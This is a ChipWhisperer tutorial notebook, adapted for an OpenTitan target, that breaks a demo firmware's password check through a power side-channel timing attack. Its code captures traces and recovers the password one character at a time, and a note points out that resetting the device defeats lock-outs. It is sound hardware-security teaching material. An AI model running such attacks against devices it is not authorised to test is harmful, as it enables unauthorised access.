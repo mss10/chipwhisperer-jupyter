{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Timing Analysis with Power for Password Bypass\n",
    "\n",
    "Supported setups:\n",
    "\n",
    "SCOPES:\n",
    "\n",
    "* OPENADC\n",
    "* CWNANO\n",
    "\n",
    "PLATFORMS:\n",
    "\n",
    "* CWLITEARM\n",
    "* CWLITEXMEGA\n",
    "* CWNANO"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This tutorial will introduce you to breaking devices by determining when a device is performing certain operations. It will use a simple password check, and demonstrate how to perform a basic power analysis.\n",
    "\n",
    "Note this is not a prerequisite to the tutorial on breaking AES. You can skip this tutorial if you wish to go ahead with the AES tutorial."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'OpenTitan'  # 'CWLITEARM'\n",
    "CRYPTO_TARGET = 'NONE'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Firmware"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Like before, we'll need to setup our `PLATFORM`, then build the firmware:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": [
     0
    ]
   },
   "outputs": [],
   "source": [
    "%%bash -s \"$PLATFORM\" \"$CRYPTO_TARGET\"\n",
    "cd ../hardware/victims/firmware/basic-passwdcheck\n",
    "make PLATFORM=$1 CRYPTO_TARGET=$2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Setup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Setup is the same as usual, except this time we'll be capturing 2000 traces."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "# Subprocess\n",
    "import subprocess\n",
    "from subprocess import PIPE\n",
    "# Serial communication\n",
    "import serial"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Connect to scope and target\n",
    "%run \"Helper_Scripts/Setup_OpenTitan.ipynb\"\n",
    "# Connect to serial via pipe\n",
    "connectSerial(target)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Build and Flash SW to Arty S7"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "# Build and Flash SW to Arty S7\n",
    "flash_file = 'build_basic.sh'\n",
    "file_path = '/home/ms/opentitan'\n",
    "\n",
    "# Reset Target and Flash SW\n",
    "reset_target(scope)\n",
    "time.sleep(0.025)\n",
    "flash_software(flash_file, file_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Communicating With The Target"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As was mentioned at the beginning of the tutorial, the firmware we loaded onto the target implements a basic password check. After getting a `'\\n'` terminated password, the target checks it and enters an infinite loop, so before communicating with it, we'll need to reset it.\n",
    "\n",
    "We'll be doing this a lot, so we'll define a function that resets the target (this function is also available by running \"Helper_Scripts/Setup_OpenTitan.ipynb\" as we did above):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": [
     0
    ]
   },
   "outputs": [],
   "source": [
    "# Define Reset_Target, already available in \"Helper_Scripts/Setup_OpenTitan.ipynb\"\n",
    "import time\n",
    "def reset_target(scope):\n",
    "    if PLATFORM == \"CW303\" or PLATFORM == \"CWLITEXMEGA\":\n",
    "        scope.io.pdic = 'low'\n",
    "        time.sleep(0.05)\n",
    "        scope.io.pdic = 'high'\n",
    "        time.sleep(0.05)\n",
    "    # Reset pin in OpenTitan layout has to be connected to pdic pin of ChipWhisperer \n",
    "    if PLATFORM == \"OpenTitan\":\n",
    "        scope.io.pdic = 'low'\n",
    "        time.sleep(0.05)\n",
    "        scope.io.pdic = 'high'\n",
    "        time.sleep(0.05)\n",
    "        #flash_file = 'build_basic.sh'\n",
    "        #pipe = subprocess.run(flash_file, stdout=PIPE, cwd='/home/ms/opentitan')\n",
    "    else:  \n",
    "        scope.io.nrst = 'low'\n",
    "        time.sleep(0.05)\n",
    "        scope.io.nrst = 'high'\n",
    "        time.sleep(0.05)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The target sends some text to us upon starting. After running the block below, you should see some text appear. \n",
    "\n",
    "**NOTE**\n",
    "The text may appear cutoff, accompanied by a message about data loss. This means that the buffer used to store serial data (128 bytes) from the target is full. This isn't an issue here, since the text is just aesthetic, but keep this in mind if you want to do large transfers of serial data using ChipWhisperer. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "result = \"\"\n",
    "ret = bytes()\n",
    "reset_target(scope)\n",
    "time.sleep(0.025)\n",
    "flash_software(flash_file, file_path)\n",
    "time.sleep(4)\n",
    "target.flush()\n",
    "\n",
    "num_char = target.in_waiting()\n",
    "print(num_char)\n",
    "while num_char > 0:\n",
    "    ret += target.read()\n",
    "    time.sleep(0.05)\n",
    "    num_char = target.in_waiting()\n",
    "    \n",
    "if ret:\n",
    "    result = ret.decode(\"utf-8\")\n",
    "    result = result.split(\"*****\", 1)\n",
    "    print(result[1])\n",
    "#print(ret)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we can send the target a password:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "time.sleep(0.25)\n",
    "#target.flush()\n",
    "\n",
    "ENDCMD = '\\n'\n",
    "message = 'h0px3'\n",
    "\n",
    "text = message + ENDCMD\n",
    "text_enc = text.encode()\n",
    "\n",
    "target.write(text_enc)\n",
    "#time.sleep(0.5)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And get the response. We sent it the right password (h0px3), so you should see \"Access granted, Welcome!\":"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "CORG = '\\x1b[6;39;43m'\n",
    "CBLACK  = '\\33[30m'\n",
    "CEND = '\\033[0m'\n",
    "\n",
    "resp = bytes()\n",
    "resp += target.read()\n",
    "\n",
    "if resp:\n",
    "    print(CORG + CBLACK + resp.decode(\"utf-8\") + CEND)\n",
    "        \n",
    "#print(target.read())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**tip**\n",
    "\n",
    "In real systems, you may often know one of the passwords, which is sufficient to investigate the password checking routines as we will do. You also normally have an ability to reset passwords to default. While the reset procedure would erase any data you care about, the attacker will be able to use this 'sacrificial' device to learn about possible vulnerabilities. So the assumption that we have access to the password is really just saying we have access to a password, and will use that knowledge to break the system in general."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Recording Traces"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we can communicate with our super-secure system, our next goal is to get a power trace while the target is running. To do this, we'll arm the scope just before we send our password attempt, then record the trace as we've done before."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if PLATFORM == \"CWNANO\":\n",
    "    scope.adc.samples = 800\n",
    "elif PLATFORM == \"OpenTitan\":\n",
    "    scope.adc.samples = 1500 # 2000\n",
    "    scope.gain.db = 50"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "result = \"\"\n",
    "ret = bytes()\n",
    "reset_target(scope)\n",
    "time.sleep(0.025)\n",
    "flash_software(flash_file, file_path)\n",
    "time.sleep(4)\n",
    "num_char = target.in_waiting()\n",
    "while num_char > 0:\n",
    "    ret += target.read()\n",
    "    time.sleep(0.01)\n",
    "    num_char = target.in_waiting()\n",
    "    \n",
    "if ret:\n",
    "    result = ret.decode(\"utf-8\")\n",
    "    result = result.split(\"*****\", 1)\n",
    "    print(result[1])\n",
    "\n",
    "retrn = \"\"\n",
    "scope.arm()\n",
    "target.flush()\n",
    "ENDCMD = '\\n'\n",
    "message = 'h0px3'\n",
    "\n",
    "text = message + ENDCMD # \"h0px3\\n\"\n",
    "text_enc = text.encode()\n",
    "target.write(text_enc)\n",
    "retrn = scope.capture()\n",
    "if retrn:\n",
    "    print('Timeout happened during acquisition')\n",
    "        \n",
    "trace = scope.get_last_trace()\n",
    "resp = bytes()\n",
    "num_char = target.in_waiting()\n",
    "while num_char > 0:\n",
    "    resp += target.read()\n",
    "    time.sleep(0.01)\n",
    "    num_char = target.in_waiting()\n",
    "if resp:\n",
    "    print(CORG + CBLACK + resp.decode(\"utf-8\") + CEND)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we have a trace, we'll plot it:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": [
     0
    ]
   },
   "outputs": [],
   "source": [
    "# Define zoom function\n",
    "%matplotlib notebook\n",
    "import matplotlib.pylab as plt\n",
    "\n",
    "def zoom_factory(ax,base_scale = 2.):\n",
    "    def zoom_fun(event):\n",
    "        # get the current x and y limits\n",
    "        cur_xlim = ax.get_xlim()\n",
    "        cur_ylim = ax.get_ylim()\n",
    "        cur_xrange = (cur_xlim[1] - cur_xlim[0])*.5\n",
    "        cur_yrange = (cur_ylim[1] - cur_ylim[0])*.5\n",
    "        xdata = event.xdata # get event x location\n",
    "        ydata = event.ydata # get event y location\n",
    "        if (event.button) == 'up':\n",
    "            # deal with zoom in\n",
    "            scale_factor = 1/base_scale\n",
    "        elif (event.button) == 'down':\n",
    "            # deal with zoom out\n",
    "            scale_factor = base_scale\n",
    "        else:\n",
    "            # deal with something that should never happen\n",
    "            scale_factor = 1\n",
    "            print (event.button)\n",
    "        # set new limits\n",
    "        ax.set_xlim([xdata - cur_xrange*scale_factor,\n",
    "                     xdata + cur_xrange*scale_factor])\n",
    "        ax.set_ylim([ydata - cur_yrange*scale_factor,\n",
    "                     ydata + cur_yrange*scale_factor])\n",
    "        plt.draw() # force re-draw\n",
    "\n",
    "    fig = ax.get_figure() # get the figure of interest\n",
    "    # attach the call back\n",
    "    fig.canvas.mpl_connect('scroll_event',zoom_fun)\n",
    "\n",
    "    #return the function\n",
    "    return zoom_fun\n",
    "\n",
    "#def on_plot_hover(event):\n",
    "    # Iterating over each data member plotted\n",
    "    #for curve in plot.get_lines():\n",
    "        # Searching which data member corresponds to current mouse position\n",
    "        #if curve.contains(event)[0]:\n",
    "            #print (\"over %s\" % curve.get_gid())\"\"\"\n",
    "\n",
    "\n",
    "#fig =  plt.figure()\n",
    "#myplot = plt.plot(trace)\n",
    "#fig.canvas.mpl_connect('motion_notify_event', on_plot_hover) \n",
    "#ax = plt.gca()\n",
    "# #ax3.margins(x=0, y=-0.25)   # Values in (-0.5, 0.0) zooms in to center\n",
    "#scale = 1.5\n",
    "#f = zoom_factory(ax,base_scale = scale)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "# Plot and pick\n",
    "\n",
    "fig = plt.figure();\n",
    "ax = fig.add_subplot(111)\n",
    "ax.plot(trace, 'g')\n",
    "\n",
    "def onclick(event):\n",
    "    a = ('button=%d, x=%d, y=%d, xdata=%f, ydata=%f' %\n",
    "          (event.button, event.x, event.y, event.xdata, event.ydata))\n",
    "    ax.set_title(a)\n",
    "\n",
    "cid = fig.canvas.mpl_connect('button_press_event', onclick)\n",
    "\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Timing Analysis"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we can capture traces, we can begin planning our attack. First we'll make a function to guess a password and return a power trace, since we'll be repeating those steps a lot:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "def cap_pass_trace(pass_guess):\n",
    "    ret = bytes()\n",
    "    resp = \"\"\n",
    "    reset_target(scope)\n",
    "    time.sleep(0.05)\n",
    "    flash_software(flash_file, file_path)\n",
    "    time.sleep(4)\n",
    "    \n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        ret += target.read() # num_char, 10\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "\n",
    "    scope.arm()\n",
    "    target.write(pass_guess.encode())\n",
    "    time.sleep(0.05)\n",
    "    resp = scope.capture()\n",
    "    if resp:\n",
    "        print('Timeout happened during acquisition')\n",
    "\n",
    "    trace = scope.get_last_trace()\n",
    "    return trace"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, we'll try two different passwords and see if the power traces differ by length. We'll then plot both traces on the same figure (with the first in red and the second in blue)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "%matplotlib notebook\n",
    "import matplotlib.pylab as plt\n",
    "from scipy.signal import find_peaks\n",
    "\n",
    "scope.adc.samples = 1500\n",
    "scope.gain.db = 48\n",
    "\n",
    "t_correct = \"h\\n\"\n",
    "t_false = \"\\n\"\n",
    "trace_correct = cap_pass_trace(t_correct)\n",
    "trace_wrong   = cap_pass_trace(t_false)     \n",
    "\n",
    "#ax = plt.gca()\n",
    "\n",
    "scale = 1.5\n",
    "\n",
    "\n",
    "fig = plt.figure();\n",
    "ax = fig.add_subplot(111)\n",
    "#ax.plot(trace)\n",
    "ax.plot(trace_wrong, 'r')\n",
    "ax.plot(trace_correct, 'g')\n",
    "#plt.ylim(-0.07, 0.07)\n",
    "#plt.xlim(1800, 3000)\n",
    "#ax.ylim(-0.7, 0.7)\n",
    "#ax.xlim(0, 3000)\n",
    "\n",
    "def onclick(event):\n",
    "    a = ('button=%d, x=%d, y=%d, xdata=%f, ydata=%f' %\n",
    "          (event.button, event.x, event.y, event.xdata, event.ydata))\n",
    "    ax.set_title(a)\n",
    "\n",
    "cid = fig.canvas.mpl_connect('button_press_event', onclick)\n",
    "f = zoom_factory(ax,base_scale = scale)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Find peaks in graph\n",
    "fig = plt.figure();\n",
    "peaks, _ = find_peaks(trace_wrong, distance=30)\n",
    "peaks2, _ = find_peaks(-trace_wrong, distance=15, prominence=(0.28, None))\n",
    "peaks3, _ = find_peaks(trace_wrong, width=30)\n",
    "peaks4, _ = find_peaks(trace_wrong, threshold=-0.5)     # Required vertical distance to its direct neighbouring samples, pretty useless\n",
    "plt.subplot(2, 2, 1)\n",
    "plt.plot(peaks, trace_wrong[peaks], \"xb\"); plt.plot(trace_wrong, 'r'); plt.legend(['distance'])\n",
    "plt.subplot(2, 2, 2)\n",
    "plt.plot(peaks2, trace_wrong[peaks2], \"xb\"); plt.plot(trace_wrong, 'r'); plt.legend(['prominence'])\n",
    "plt.subplot(2, 2, 3)\n",
    "plt.plot(peaks3, trace_wrong[peaks3], \"xb\"); plt.plot(trace_wrong, 'r'); plt.legend(['width'])\n",
    "plt.subplot(2, 2, 4)\n",
    "plt.plot(peaks4, trace_wrong[peaks4], \"xb\"); plt.plot(trace_wrong, 'r'); plt.legend(['threshold'])\n",
    "plt.show()\n",
    "print(peaks2)\n",
    "print(trace_wrong[peaks2])\n",
    "print(len(peaks2))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You should see both traces start and end similarly, but differ elsewhere. If you look closely, you should see that the blue trace looks a lot like the red trace but shifted later in time. We'll use this timing difference to break the password!\n",
    "\n",
    "Edit the above block to try different passwords and see how it changes for different lengths and number of correct characters. \n",
    "\n",
    "Go back to the original guesses (`\"\\n\"` and `\"h\\n\"`) and find some distinct spikes that get shifted in time. Your target may differ, but in my case, there were some distinct spikes of about -0.25 at 229 in red and 265 in blue. The plot is interactive, so you can zoom in and move around using the buttons on the right side of the plot. Record their locations, value, and the difference in location (in my case, 229, 265, -0.25, and 36). \n",
    "\n",
    "Using distinct peaks may not always work. Instead of distinct peaks you can use where the two traces start to diverge. At the beginning the power traces are similar even though the number of characters correct is different. However, there is a point where they start to become significantly different. If you can find this spot you can use this spot to do the timing analysis instead. The difference in location should be the same as when using distinct peaks.\n",
    "\n",
    "An even easier way to see this is to simply plot *every* possible first letter. If there is some sort of timing attack, we should see everything take one path, except for a single outlier. Let's try plotting a few traces this way and hope we get an interesting outlier."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "%matplotlib notebook\n",
    "import matplotlib.pylab as plt\n",
    "\n",
    "trylist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "for c in trylist:\n",
    "    next_pass = c + \"\\n\"\n",
    "    trace = cap_pass_trace(next_pass)\n",
    "    plt.plot(trace)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attacking a Single Letter"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we've located a distinctive timing difference, we can start building our attack. We'll start with a single letter, since that will quickly give us some feedback on the attack.\n",
    "\n",
    "The plan for the attack is simple: keep guessing letters until we no longer see the distinctive spike in the original location. To do this, we'll create a loop that:\n",
    "\n",
    "* Figures out our next guess\n",
    "* Does the capture and records the trace\n",
    "* Checks if sample 229 is larger than -0.2 (replace with appropriate values)\n",
    "\n",
    "To make things a little easier for later, we'll make a function that will return whether our spike is (guess incorrect) or isn't (guess correct) in the right location:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#print(PLATFORM)\n",
    "def checkpass(trace, i):\n",
    "    if PLATFORM == \"CWNANO\":\n",
    "        #There's a bit of jitter\n",
    "        return (trace[228 + 11*i] < 3 and trace[227 + 11*i] < 0.3)\n",
    "    elif PLATFORM == \"CWLITEARM\" or PLATFORM == \"CW308_STM32F3\":\n",
    "        return trace[229 + 36*i] > -0.2\n",
    "    elif PLATFORM == \"CW303\" or PLATFORM == \"CWLITEXMEGA\":\n",
    "        return trace[73 + 40 * i] > -0.3\n",
    "    elif PLATFORM == \"OpenTitan\":\n",
    "        return trace[35 + 40 * i] > -0.15\n",
    "    \n",
    "def checkpass_array(trace, peaks):\n",
    "    result = []\n",
    "    if PLATFORM == \"OpenTitan\":\n",
    "        for xi in peaks:\n",
    "            #result = trace[xi] > -0.2\n",
    "            if (trace[int(xi)] > -0.2):\n",
    "                #print(\"found\\n\")\n",
    "                result.append(int(xi))\n",
    "        return result"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The below loop finds the first correct character, prints it, then ends. You should see \"Success: h\" after a while."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "trylist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "password = \"\"\n",
    "#xr = [502, 531, 582, 685, 818]\n",
    "#xg = [490, 569, 628, 810, 815]\n",
    "#peaks, _ = find_peaks(trace, distance=30)\n",
    "peaks2, _ = find_peaks(-trace_wrong, distance=15, prominence=(0.28, None))\n",
    "peaks2_filt = [i for i in peaks2 if i >= 200]\n",
    "print(len(peaks2_filt))\n",
    "print(peaks2_filt)\n",
    "print(\"\\n\")\n",
    "res = []\n",
    "for c in trylist:\n",
    "    next_pass = password + c + \"\\n\"\n",
    "    trace = cap_pass_trace(next_pass)\n",
    "\n",
    "    #if checkpass(trace, 0):\n",
    "    res = checkpass_array(trace, peaks2_filt)\n",
    "    if res:\n",
    "        print(\"Success: \" + c + \"\\n\")\n",
    "        print(\"Success: \" + str(res) + \":\" + str(trace[res]) + \"\\n\")\n",
    "        print(\"\\n\")\n",
    "        #break\n",
    "\n",
    "xi = res"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "fig = plt.figure();\n",
    "print(str(xi) + \" | \" + str(trace[xi]))\n",
    "plt.subplot(1, 1, 1)\n",
    "plt.plot(xi, trace[xi], \"xb\"); plt.plot(trace, 'r'); plt.legend(['guess pwd'])\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Note that you will likely need to change the values in `checkpass`, or simply define your own `checkpass()` function."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if c != 'h':\n",
    "    raise ValueError(\"Incorrect guess - you need to adjust the comparison location and/or direction to make this work\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attacking the Full Password"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we can guess a single character, attacking the rest is easy; we just need to repeat the process in another loop, move the check point (this is the change is location you recorded earlier), and update our guess with the new correct letter.\n",
    "\n",
    "After updating the below script and running it, you should see parts of the password printed out as each letter is found."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "trylist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "password = \"\"\n",
    "for i in range(5):\n",
    "    for c in trylist:\n",
    "        next_pass = password + c + \"\\n\"\n",
    "        trace = cap_pass_trace(next_pass)\n",
    "        if checkpass(trace, i):\n",
    "            password += c\n",
    "            print(\"Success, pass now {}\".format(password))\n",
    "            break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "That's it! You should have successfully cracked a password using the timing attack. Some notes on this method:\n",
    "\n",
    "* The target device has a finite start-up time, which slows down the attack. If you wish, remove some of the `printf()`'s from the target code, recompile and reprogram, and see how quickly you can do this attack.\n",
    "* The current script doesn't look for the \"WELCOME\" message when the password is OK. That is an extension that allows it to crack any size password.\n",
    "* If there were a lock-out on a wrong password, the system would ignore it, as it resets the target after every attempt."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Conclusion"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This tutorial has demonstrated the use of the power side-channel for performing timing attacks. A target with a simple password-based security system is broken."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "assert (password == \"h0px3\"), \"Failed to break password, got {}.\\nIf on Nano, may need to rerun\".format(password)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
